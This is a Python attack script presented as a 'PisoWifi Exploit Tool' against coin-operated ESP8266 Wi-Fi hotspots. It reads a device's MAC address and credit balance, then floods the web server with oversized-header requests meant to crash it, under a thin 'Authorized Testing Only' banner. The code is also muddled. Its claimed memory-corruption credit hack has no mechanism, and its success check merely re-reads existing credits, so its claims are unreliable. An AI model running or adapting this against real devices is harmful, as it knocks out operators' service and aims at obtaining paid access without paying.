#!/usr/bin/env python3
import requests
import re
import time
from colorama import Fore, Style, init
import socket
import struct
from threading import Thread

init()
print(Fore.BLUE + """
PisoWifi Exploit Tool (Authorized Testing Only)
---------------------------------------------
""" + Style.RESET_ALL)

class PisoWifiExploit:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.session = requests.Session()
        self.session.headers = {
            'User-Agent': 'Mozilla/5.0',
            'Accept': '*/*',
            'Connection': 'keep-alive'
        }
        self.mac = None
        self.credits = 0

    def _send_malformed_packet(self, payload):
        """Send raw malformed packets to crash ESP8266"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((self.target_ip, 80))
            
            # Craft malicious HTTP request
            corrupt_header = (
                f"GET /{payload} HTTP/1.1\r\n"
                f"Host: {self.target_ip}\r\n"
                "User-Agent: Mozilla/5.0\r\n"
                "Accept: */*\r\n"
                f"X-Corrupt: {'A'*5000}\r\n\r\n"
            )
            sock.send(corrupt_header.encode())
            sock.close()
            return True
        except:
            return False

    def _get_system_info(self):
        """Extract MAC and credits from /status endpoint"""
        try:
            r = self.session.get(f"http://{self.target_ip}/status", timeout=5)
            
            # Parse MAC (common in ESP8266 systems)
            self.mac = re.search(r"([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})", r.text)
            self.mac = self.mac.group(0) if self.mac else "Unknown"
            
            # Parse credits (Piso-specific)
            self.credits = re.search(r"P(\d+)", r.text)
            self.credits = int(self.credits.group(1)) if self.credits else 0
            
            return True
        except:
            return False

    def _check_vulnerability(self):
        """Verify if target crashes on malformed requests"""
        try:
            # Test with oversized header
            r = requests.get(
                f"http://{self.target_ip}/config",
                headers={'X-Test': 'A'*2000},
                timeout=3
            )
            return False  # Didn't crash
        except (requests.exceptions.RequestException, requests.exceptions.Timeout):
            return True  # Crashed

    def run_exploit(self):
        """Execute full exploit chain"""
        print(Fore.YELLOW + "[+] Gathering target info..." + Style.RESET_ALL)
        if not self._get_system_info():
            print(Fore.RED + "[-] Failed to get system info" + Style.RESET_ALL)
            return False

        print(Fore.GREEN + f"[+] MAC: {self.mac}" + Style.RESET_ALL)
        print(Fore.GREEN + f"[+] IP: {self.target_ip}" + Style.RESET_ALL)
        print(Fore.GREEN + f"[+] Credits: P{self.credits}" + Style.RESET_ALL)

        if not self._check_vulnerability():
            print(Fore.RED + "[-] Target not vulnerable" + Style.RESET_ALL)
            return False

        print(Fore.GREEN + "[+] Target is vulnerable!" + Style.RESET_ALL)
        print(Fore.YELLOW + "[+] Exploiting..." + Style.RESET_ALL)

        # Phase 1: Memory corruption
        print(Fore.CYAN + "[+] Sending corrupt packets..." + Style.RESET_ALL)
        for i in range(1, 4):
            if not self._send_malformed_packet(f"corrupt{i}"):
                print(Fore.RED + f"[-] Failed phase {i}" + Style.RESET_ALL)
            else:
                print(Fore.GREEN + f"[+] Corruption {i}/3 complete" + Style.RESET_ALL)
            time.sleep(1)

        # Verify exploit success
        new_credits = self._get_system_info()
        if new_credits and self.credits > 0:
            print(Fore.GREEN + f"[+] Exploit succeeded! New credits: P{self.credits}" + Style.RESET_ALL)
            return True
        else:
            print(Fore.RED + "[-] Exploit failed" + Style.RESET_ALL)
            return False

if __name__ == "__main__":
    target = input("Enter target IP: ").strip()
    exploit = PisoWifiExploit(target)
    exploit.run_exploit()